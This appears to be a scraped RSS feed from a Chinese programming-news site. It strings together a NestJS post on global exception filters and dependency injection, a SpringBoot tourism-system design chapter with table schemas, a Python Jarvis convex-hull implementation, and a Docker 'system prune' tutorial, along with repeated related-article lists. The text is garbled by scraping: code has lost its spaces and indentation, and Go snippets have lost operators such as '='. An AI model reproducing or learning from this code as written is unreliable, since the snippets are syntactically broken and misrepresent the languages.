注入依赖项第二步是在@Module模块中注册，代码如下：@Module({imports:[HttpModule],providers:[LoggerService,{provide:APP_FILTER,useClass:HttpExceptionFilter,},],})exportclassAppModule{}只有在@Module中注册，Nest才会进行自动解析和注入，就无需程序员手动去创造实例对象，这一整个流程就是依赖注入现在再来看一个例子，区分手动注入以及自动即依赖注入的区别：// 与第一步对照，可看到这里是手动创建实例（简单来说就是需要自己new一个实例）exportclassUserController{privatelogger=newLoggerService();}现在回过头来看第一种方式，代码如下：@@filename(main)asyncfunctionbootstrap(){constapp=awaitNestFactory.create(AppModule);app.useGlobalFilters(newHttpExceptionFilter());awaitapp.listen(3000);}bootstrap();这段代码没有经过@Module，自然无法执行依赖注入，即使类HttpExceptionFilrer的代码中包含构造函数且有注入的类，即代码如下的情况：@Catch()exportclassHttpExceptionFilterimplementsExceptionFilter{constructor(privatereadonlylogger:LoggerService){}// 包含注入的类catch(exception:HttpException,host:ArgumentsHost){constctx=host.switchToHttp();constresponse=ctx.getResponse();constrequest=ctx.getRequest();conststatus=exception.getStatus();this.logger.error(`Error at${request.url}:${exception.message}`,JSON.stringify(exception.getResponse()),);response.status(status).json({statusCode:status,message:exception.message,});}}当程序运行时，app会实例化HttpExceptionFilter()，但因为由于LoggerService未被注入，运行时会抛出错误，提示this.logger未定义所以如果想在全局配置异常过滤器且需要依赖注入，那么就只能在根模块使用工厂函数的方式去挂载，即第二种方式，代码如下：@Module({imports:[HttpModule],providers:[LoggerService,{provide:APP_FILTER,useClass:HttpExceptionFilter,},],})exportclassAppModule{}很明显，这里使用了@Module，那么Nest就会执行依赖注入和解析从模块内外考虑在文档中提到：In terms of dependency injection, global filters registered from outside of any module (with useGlobalFilters() as in the example above) cannot inject dependencies since this is done outside the context of any module.这里的outside of any module即模块外，在整个项目中，模块指的就是xxx.module.ts，而很明显，文件main.ts不属于任何的模块，所以称之为模块外。模块外的代码中没有@Module，所以不能实现依赖注入模块外如何注入在上面提到模块外不能依赖注入，但在文档的Exception filters最后一节即Inheritance中又出现了一个在模块外注入的例子，在文中提到Global filters can extend the base filter. This can be done in either of two ways. The first method is to inject the HttpAdapter reference when instantiating the custom global filter说可以在实例化自定义全局过滤器时注入HttpAdapter引用，用于实现全局筛选器扩展基本筛选器，代码如下：asyncfunctionbootstrap(){constapp=awaitNestFactory.create(AppModule);const{httpAdapter}=app.get(HttpAdapterHost);// 手动获取依赖项app.useGlobalFilters(newAllExceptionsFilter(httpAdapter));awaitapp.listen(3000);}bootstrap();这又如何理解？其实这不算依赖注入，至少我们可以通过①模块内or外②是否有经过@Module去辨别这不算，这种方式可以称之为依赖获取关键在于const { httpAdapter } = app.get(HttpAdapterHost);这行代码，从NestJS容器中手动获取HttpAdapterHost服务，然后传递给AllExceptionsFilter的构造函数这是手动传入，而不是由@Module自动注入并解析！容易混淆的点以为在main.ts的new AllExceptionsFilter(httpAdapter)这行代码是依赖注入，即以为传入服务就是依赖注入，本质上是没有理解依赖注入是由@Module来管理和实现的以为在main.ts的new AllExceptionsFilter()中不能传入任何服务http://www.ppmy.cn/news/1540414.html相关文章SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:49 +0000</pubDate>
    </item>
    <item>
      <title>SpringBoot实现桂林旅游的智能推荐</title>
      <link>https://www.ppmy.cn/news/1540413.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维SpringBoot实现桂林旅游的智能推荐news/2025/10/31 17:53:48/3系统分析3.1可行性分析通过对本桂林旅游景点导游平台实行的目的初步调查和分析，提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。3.1.1技术可行性本桂林旅游景点导游平台采用SSM框架，JAVA作为开发语言，是基于WEB平台的B/S架构系统。（1）Java提供了稳定的性能、优秀的升级性、更快速的开发、更简便的管理、全新的语言以及服务。整个系统帮用户做了大部分不重要的琐碎的工作。（2）基于B/S模式的系统的开发已发展日趋成熟。（3）众所周知，Java是面向对象的开发语言。程序开发员可以在Eclipse平台上面方便的使用一些已知的解决方案。因此，桂林旅游景点导游平台在开发技术上具有很高可行性，且开发人员掌握了一定的开发技术，所以此系统的开发技术具有可行性。3.1.2经济可行性本桂林旅游景点导游平台采用的软件都是开源的，这样能够削减很多的精力和资源，降低开发成本。同时对计算机的配置要求也极低，即使是淘汰下来的计算机也能够满足需要，因此，本系统在经济上是完全具有可行性的，所以在经济上是十分可行的。3.1.3操作可行性本桂林旅游景点导游平台的界面简单易操作，用户只要平时有在用过电脑，都能进行访问和操作。本系统具有易操作、易管理、交互性好的特点，在操作上是非常简单的，因此在操作上具有很高的可行性。综上所述，此系统开发目标已明确，在技术、经济和操作方面都具有很高的可行性，并且投入少、功能完善、管理方便，因此系统的开发是完全可行的。3.2系统性能分析3.2.1 系统安全性此桂林旅游景点导游平台要严格控制管理权限，具体要求如下：（1）要想对桂林旅游景点导游平台进行管理，首先要依靠用户名和密码在系统中登陆，无权限的用户不可以通过任何方式登录系统和对系统的任何信息和数据进行查看，这样可以保证系统的安全可靠性和准确性。（2）在具体实现中对不同的权限进行设定，不同权限的用户在系统中登陆后，不可以越级操作。3.2.2 数据完整性（1）所有记录信息要保持全面，信息记录内容不可以是空。（2）各种数据间相互联系要保持正确。（3）相同数据在不同记录中要保持一致。3.3系统界面分析目前，界面设计已经成为对软件质量进行评价的一条关键指标，一个好的用户界面可以使用户使用系统的信心和兴趣增加，从而使工作效率提高，JSP技术是将JAVA语言作为脚本语言的，JSP网页给整个服务器端的JAVA库单元提供了一个接口用来服务HTTP的应用程序。创建动态页面比较方便。客户界面是指软件系统与用户交互的接口，往往涵盖输出、输入、人机对话的界面格式等。1.输出设计输出是由电脑对输入的基本信息进行解决，生成高质量的有效信息，并使之具有一定的格式，提供给管理者使用，这是输出设计的主要责任和目标。系统开发的过程与实施过程相反，并不是从输入设计到输出设计，而是从输出设计到输入设计。这是由于输出表格与使用者直接相联系，设计的目的应当是确保使用者可以很方便的使用输出表格，并且可以将各部门的有用信息及时的反映出来。输出设计的准绳是既要整体琢磨不同管理层的所有需要，又要简洁，不要提供给用户不需要的信息。2.输入设计输入数据的收集和录入是比较麻烦的，需要非常多的人力和一定设备，而且经常出错。一旦输入系统的数据不正确，那么处理后的输出就会扩大这些错误，因此输入的数据的准确性对整个系统的性能起着决定性意义。输入设计有以下几点原则：1）输入量应尽量保持在能够满足处理要求的最低限度。输入量越少，错误率就会越少，数据的准备时间也越少。2）应尽可能的使输入的准备以及输入的过程进行时比较方便，这样使错误的发生率降低。3）应尽量早检查输入数据（尽量接近原数据发生点）,以便使错误更正比较及时。4）输入数据尽早地记录成其处理所需的形式，以防止数据由一种介质转移到另一种介质时需要转录而可能发生的错误。3.4系统流程和逻辑图3-3登录流程图图3-4修改密码流程图4系统概要设计4.1概述本系统采用B/S结构(Browser/Server,浏览器/服务器结构)和基于Web服务两种模式，是一个适用于Internet环境下的模型结构。只要用户能连上Internet,便可以在任何时间、任何地点使用。系统工作原理图如图4-1所示：图4-1系统工作原理图4.2系统结构本系统是基于B/S架构的网站系统，设计的功能结构图如下图所示：图4-2功能结构图4.3.数据库设计4.3.1数据库实体概念设计的目标是设计出反映某个组织部门信息需求的数据库系统概念模式，数据库系统的概念模式独立于数据库系统的逻辑结构、独立于数据库管理系统（DBMS）、独立于计算机系统。概念模式的设计方法是在需求分析的基础上，用概念数据模型（例如E-R模型）表示数据及数据之间的相互联系，设计出反映用户信息需求和处理需求的数据库系统概念模式。概念设计的目标是准确描述应用领域的信息模式，支持用户的各种应用，这样既容易转换为数据库系统逻辑模式，又容易为用户理解。数据库系统概念模式是面向现实世界的数据模型，不能直接用于数据库系统的实现。在此阶段，用户可以参与和评价数据库系统的设计，从而有利于保证数据库系统的设计与用户的需求相吻合。在概念模式的设计中，E-R模型法是最常见的设计方法。本系统的E-R图如下图所示：（1）管理员信息的实体属性图如下：图4.12 管理员信息实体属性图（2）新闻资讯信息实体属性图如图4.13所示：图4.13 新闻资讯信息实体属性图（3）景点类型信息实体属性图如图4.14所示：图4.14 景点类型信息实体属性图4.3.2数据库设计表桂林旅游景点导游平台需要后台数据库，下面介绍数据库中的各个表的详细信息：表4.1 景点信息评论表字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间refid bigint(20) 否 关联表iduserid bigint(20) 否 用户idnickname varchar(200) 是 NULL 用户名content longtext 否 评论内容reply longtext 是 NULL 回复内容表4.2 线路推荐评论表字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间refid bigint(20) 否 关联表iduserid bigint(20) 否 用户idnickname varchar(200) 是 NULL 用户名content longtext 否 评论内容reply longtext 是 NULL 回复内容表4.3 论坛交流字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间title varchar(200) 是 NULL 帖子标题content longtext 否 帖子内容parentid bigint(20) 是 NULL 父节点iduserid bigint(20) 否 用户idusername varchar(200) 是 NULL 用户名isdone varchar(200) 是 NULL 状态表4.4 景点类型字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间jingdianleixing varchar(200) 是 NULL 景点类型表4.5 景点信息字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间jingdianmingcheng varchar(200) 是 NULL 景点名称jingdianleixing varchar(200) 是 NULL 景点类型jingdiantupian varchar(200) 是 NULL 景点图片zixundianhua varchar(200) 是 NULL 咨询电话jingdianxiangqing longtext 是 NULL 景点详情thumbsupnum int(11) 是 0 赞crazilynum int(11) 是 0 踩表4.6 新闻资讯字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间title varchar(200) 否 标题introduction longtext 是 NULL 简介picture varchar(200) 否 图片content longtext 否 内容表4.7 收藏表字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间userid bigint(20) 否 用户idrefid bigint(20) 是 NULL 收藏idtablename varchar(200) 是 NULL 表名name varchar(200) 否 收藏名称picture varchar(200) 否 收藏图片表4.8 管理员表字段 类型 空 默认 注释id (主键) bigint(20) 否 主键username varchar(100) 否 用户名password varchar(100) 否 密码role varchar(100) 是 管理员 角色addtime timestamp 否 CURRENT_TIMESTAMP 新增时间表4.9 线路推荐字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间xianlubianhao varchar(200) 否 线路编号biaoti varchar(200) 是 NULL 标题peitu varchar(200) 是 NULL 配图chufadi varchar(200) 是 NULL 出发地mudedi varchar(200) 是 NULL 目的地yudingshuliang int(11) 是 NULL 预订数量yudingjiage int(11) 是 NULL 预订价格xianluxiangqing longtext 是 NULL 线路详情thumbsupnum int(11) 是 0 赞crazilynum int(11) 是 0 踩表4.10 用户字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间yonghuming varchar(200) 否 用户名mima varchar(200) 否 密码xingming varchar(200) 否 姓名xingbie varchar(200) 是 NULL 性别shouji varchar(200) 是 NULL 手机youxiang varchar(200) 是 NULL 邮箱shenfenzheng varchar(200) 是 NULL 身份证zhaopian varchar(200) 是 NULL 照片表4.11 预订信息字段 类型 空 默认 注释id (主键) bigint(20) 否 主键addtime timestamp 否 CURRENT_TIMESTAMP 创建时间yudingdanhao varchar(200) 否 预订单号xianlubianhao varchar(200) 是 NULL 线路编号biaoti varchar(200) 是 NULL 标题peitu varchar(200) 是 NULL 配图chufadi varchar(200) 是 NULL 出发地mudedi varchar(200) 是 NULL 目的地yudingshuliang int(11) 是 NULL 预订数量yudingjiage int(11) 是 NULL 预定价格zongjine int(11) 是 NULL 总金额yonghuming varchar(200) 是 NULL 用户名xingming varchar(200) 是 NULL 姓名shenfenzheng varchar(200) 是 NULL 身份证yudingshijian datetime 是 NULL 预定时间beizhu varchar(200) 是 NULL 备注ispay varchar(200) 是 未支付 是否支付http://www.ppmy.cn/news/1540413.html相关文章Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:48 +0000</pubDate>
    </item>
    <item>
      <title>Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）</title>
      <link>https://www.ppmy.cn/news/1540412.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）news/2025/10/31 17:53:47/给定平面中的一组点，该集合的凸包是包含该集合所有点的最小凸多边形。我们强烈建议您先阅读以下文章。如何检查两个给定的线段是否相交？c++ https://blog.csdn.net/hefeng_aspnet/article/details/141713655java https://blog.csdn.net/hefeng_aspnet/article/details/141713762python https://blog.csdn.net/hefeng_aspnet/article/details/141714389C# https://blog.csdn.net/hefeng_aspnet/article/details/141714420javascript https://blog.csdn.net/hefeng_aspnet/article/details/141714442贾维斯算法的思想很简单，我们从最左边的点（或 x 坐标值最小的点）开始，然后继续沿逆时针方向包裹点。最大的问题是，给定一个点 p 作为当前点，如何在输出中找到下一个点？这里的想法是使用orientation()。//c++ C++ 3 个有序点的方向（Orientation of 3 ordered points）-CSDN博客//java Java 3 个有序点的方向（Orientation of 3 ordered points）-CSDN博客//python Python 3 个有序点的方向（Orientation of 3 ordered points）_gh python 判断三点是否顺时针方向 如果是则反序-CSDN博客//C# C# 3 个有序点的方向（Orientation of 3 ordered points）-CSDN博客//Javascript javascript 3 个有序点的方向（Orientation of 3 ordered points）_threejs计算三个点的朝向-CSDN博客下一个点被选为在逆时针方向上领先于所有其他点的点，即，如果对于任何其他点 r，我们有“orientation(p, q, r) = 逆时针”，则下一个点是 q。算法：步骤 1)将 p 初始化为最左边的点。步骤 2)继续进行，直到不再回到第一个（或最左边的）点。2.1)下一个点 q 是这样的点，即对于任何其他点 r，三元组 (p, q, r) 都是逆时针的。为了找到这一点，我们只需将 q 初始化为下一个点，然后遍历所有点。对于任意点 i，如果 i 更偏向逆时针，即 orientation(p, i, q) 是逆时针的，则我们将 q 更新为 i。我们的 q 的最终值将是最逆时针的点。2.2） next[p] = q（将 q 作为 p 的下一个存储在输出凸包中）。2.3） p = q（将 p 设置为 q 以进行下一次迭代）。以下是上述算法的实现:# Python3 program to find convex hull of a set of points. Refer# https://www.geeksforgeeks.org/orientation-3-ordered-points/# for explanation of orientation()# point class with x, y as pointclass Point:def __init__(self, x, y):self.x = xself.y = ydef Left_index(points):'''Finding the left most point'''minn = 0for i in range(1,len(points)):if points[i].x &lt; points[minn].x:minn = ielif points[i].x == points[minn].x:if points[i].y &gt; points[minn].y:minn = ireturn minndef orientation(p, q, r):'''To find orientation of ordered triplet (p, q, r).The function returns following values0 --&gt; p, q and r are collinear1 --&gt; Clockwise2 --&gt; Counterclockwise'''val = (q.y - p.y) * (r.x - q.x) - \(q.x - p.x) * (r.y - q.y)if val == 0:return 0elif val &gt; 0:return 1else:return 2def convexHull(points, n):# There must be at least 3 pointsif n &lt; 3:return# Find the leftmost pointl = Left_index(points)hull = []'''Start from leftmost point, keep moving counterclockwiseuntil reach the start point again. This loop runs O(h)times where h is number of points in result or output.'''p = lq = 0while(True):# Add current point to resulthull.append(p)'''Search for a point 'q' such that orientation(p, q,x) is counterclockwise for all points 'x'. The ideais to keep track of last visited most counterclock-wise point in q. If any point 'i' is more counterclock-wise than q, then update q.'''q = (p + 1) % nfor i in range(n):# If i is more counterclockwise# than current q, then update qif(orientation(points[p],points[i], points[q]) == 2):q = i'''Now q is the most counterclockwise with respect to pSet p as q for next iteration, so that q is added toresult 'hull''''p = q# While we don't come to first pointif(p == l):break# Print Resultfor each in hull:print(points[each].x, points[each].y)# Driver Codepoints = []points.append(Point(0, 3))points.append(Point(2, 2))points.append(Point(1, 1))points.append(Point(2, 1))points.append(Point(3, 0))points.append(Point(0, 0))points.append(Point(3, 3))convexHull(points, len(points))# This code is contributed by# Akarsh Somani, IIIT Kalyani输出：（0，3）（0，0）（3，0）（3，3）时间复杂度：O(m * n)，其中 n 是输入点数，m 是输出点数或船体点数 (m &lt;= n)。对于船体上的每个点，我们都会检查所有其他点以确定下一个点。最坏情况，时间复杂度：O(n 2 )。最坏情况发生在所有点都在船体上（m = n）。辅助空间：O（n），因为已占用 n 个额外空间。集合 2-凸包（Graham 扫描）注意：当凸包中存在共线点时，上述代码可能会对不同顺序的输入产生不同的结果。例如，当输入 (0, 3), (0, 0), (0, 1), (3, 0), (3, 3) 时，它产生 (0, 3) (0, 0) (3, 0) (3, 3) 的输出；当输入 (0, 3), (0, 1), (0, 0), (3, 0), (3, 3) 时，输出为 (0, 3) (0, 1) (0, 0) (3, 0) (3, 3)。如果是共线，我们通常需要最远的下一个点，如果是共线点，我们可以通过添加一个 if 条件来获得所需的结果。请参考此修改后的代码。资料来源：http://www.dcs.gla.ac.uk/~pat/52233/slides/Hull1x1.pdfhttp://www.ppmy.cn/news/1540412.html相关文章Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...Golang | Leetcode Golang题解之第480题滑动窗口中位数题目&amp;#xff1a; 题解&amp;#xff1a; 
type hp struct {sort.IntSlicesize int
}
func (h *hp) Push(v interface{}) { h.IntSlice  append(h.IntSlice, v.(int)) }
func (h *hp) Pop() interface{}   { a : h.IntSlice; v : a[len(a)-1]; h.IntSlice  a[:len(a)-1]; return v }…阅读更多...学习的文档10/14为什么不推荐使用外键与级联? 
【强制】不得使用外键与级联&amp;#xff0c;一切外键概念必须在应用层解决。 
说明: 以学生和成绩的关系为例&amp;#xff0c;学生表中的 student_id 是主键&amp;#xff0c;那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id&amp;#xff0c…阅读更多...利用高德API获取整个城市的公交路线并可视化（六）记录于2024年10月，因数据获取受网站更新策略等影响可能会失效，故记录写作时间，书接上回，根据测试地铁线路也可以如法炮制，且地铁线路更少，实现起来更容易，本篇文章我们依然以厦门地铁作为示例。 
先讲一下方法思路，一共四个步骤； 
方法思路 高德开放平台的JS API 1.4 …阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:48 +0000</pubDate>
    </item>
    <item>
      <title>Docker system</title>
      <link>https://www.ppmy.cn/news/1540411.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Docker systemnews/2025/10/31 17:53:47/docker system --helpsiqi@aliyun-sh-001:~/images$sudodocker system --helpUsage:  docker system COMMANDManage DockerCommands:dfShow docker disk usage(显示docker磁盘使用情况)events      Get realtimeevents from the server(从服务器获取实时事件)info        Display system-wide information(显示系统信息)prune       Remove unused data(删除不使用的数据)Run'docker system COMMAND --help'formoreinformation on a command.docker system df提供Docker整体磁盘使用率的概况，包括镜像、容器和（本地）volume。所以我们现在随时都可以查看Docker使用了多少资源siqi@aliyun-sh-001:~/code/data-analysis/api$sudodocker systemdfTYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLE
Images482248.73GB38.21GB(78%)Containers292910.44MB   0B(0%)Local Volumes107493.68GB93.62GB(99%)Build Cache11603.66MB3.66MBdocker system prune删除所有未使用的容器、网络、映像（包括悬挂的和未引用的），以及卷（可选）未使用的容器：所有已停止的容器将被删除未使用的镜像：只有悬挂的镜像（未被任何容器引用）将被删除，除非使用了 -a 或 --all 参数未使用的网络：所有未被容器使用的自定义网络将被删除未使用的卷（如果使用 --volumes 或 -v 选项）：所有未被容器引用的卷将被删除相关参数：-a, --all：删除未被任何容器引用的所有镜像，而不仅仅是悬挂的镜像–filter：根据提供的条件过滤要删除的内容–force, -f：跳过确认步骤，直接执行删除，不加的话在执行步骤时需要手动确认，建议不用。手动容错率高一点–volumes, -v：删除所有未被至少一个容器引用的卷删除所有未使用的容器、镜像、网络：docker system prune删除所有未使用的容器、镜像（包括未被引用的）、网络：docker system prune -a删除所有未使用的容器、镜像、网络、卷：docker system prune --volumessiqi@aliyun-sh-001:~/images$sudodocker system prune
WARNING!This will remove:- all stopped containers- all networks not used by at least one container- all dangling images- all dangling build cacheAre you sure you want to continue?[y/N]y
Deleted Images:
deleted: sha256:d66359a5ae191ca285bc1167518dea4fd83536e5135c017503205637ef365ffeDeleted build cache objects:
76d2jytvsnm5zni5k03nb1nlq
ndsu19mwql70b6kt9yktrpwon
q9tsol0v4tkfzfoszvo2x9zvx
